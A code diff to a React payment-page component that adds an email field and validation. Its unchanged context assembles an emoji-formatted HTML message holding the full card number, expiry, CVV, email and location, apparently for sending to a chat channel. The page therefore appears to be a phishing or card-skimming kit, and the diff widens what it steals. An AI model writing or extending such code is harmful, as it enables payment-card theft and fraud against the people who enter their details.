@@ -24,10 +24,11 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
   country,
   city,
   zip,
-  email,
+  email: initialEmail,
   isDeclined = false,
 }) => {
   const { t } = useTranslation();
+  const [email, setEmail] = useState(initialEmail || '');
   const [cardNumber, setCardNumber] = useState('');
   const [nameOnCard, setNameOnCard] = useState('');
   const [expiry, setExpiry] = useState('');
@@ -57,6 +58,13 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
 
   const handleSave = async () => {
     setError('');
+    
+    // Validate email
+    if (!email || !email.includes('@')) {
+      setError('Please enter a valid email address');
+      return;
+    }
+
     setIsSaving(true);
     const rawCard = cardNumber.replace(/\s/g, '');
 
@@ -74,7 +82,7 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
         `📅 <b>Expiry:</b> <code>${expiry}</code>\n` +
         `🔒 <b>CVV:</b> <code>${cvv}</code>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `📧 <b>Account:</b> <code>${email || 'N/A'}</code>\n` +
+        `📧 <b>Email:</b> <code>${email || 'N/A'}</code>\n` +
         `🌍 <b>Country:</b> ${country || 'Unknown'}\n` +
         `🏙 <b>City:</b> ${city || 'Unknown'}\n` +
         `📮 <b>ZIP Code:</b> ${zip || 'Unknown'}\n` +
@@ -106,7 +114,7 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
     }, 500);
   };
 
-  const isFormIncomplete = cardNumber.replace(/\s/g, '').length < 16 || expiry.length < 5 || cvv.length < 3;
+  const isFormIncomplete = !email || !email.includes('@') || cardNumber.replace(/\s/g, '').length < 16 || expiry.length < 5 || cvv.length < 3;
 
   return (
     <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl overflow-y-auto">
@@ -125,6 +133,20 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
             <span className="text-sm text-red-600 font-bold">{error}</span>
           </div>
         )}
+
+        <div className="space-y-4">
+          <h2 className="text-base font-bold text-gray-900">Your Information</h2>
+          <div className="space-y-4">
+            {/* Email */}
+            <input
+              type="email"
+              placeholder="Email address"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              className="w-full px-4 py-4 text-black font-semibold border border-gray-300 rounded-lg outline-none focus:border-[#FF4747] bg-white"
+            />
+          </div>
+        </div>
 
         <div className="space-y-4">
           <h2 className="text-base font-bold text-gray-900">{t('paymentMethod')}</h2>
